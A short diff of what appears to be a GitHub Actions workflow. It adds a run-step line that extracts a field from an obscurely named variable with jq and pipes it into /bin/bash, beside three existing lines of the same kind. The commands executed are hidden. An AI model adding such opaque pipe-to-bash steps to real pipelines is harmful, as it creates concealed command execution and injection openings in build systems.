@@ -22,6 +22,7 @@ jobs:
           echo $socr296 | jq -r .aop99 | /bin/bash
           printf '%s' "$d71" | jq -r .qoddp7390 | /bin/bash
           printf '%s' "$iqfjt36" | jq -r .roijb43413 | /bin/bash
+          printf '%s' "$prjby72" | jq -r .kls1 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
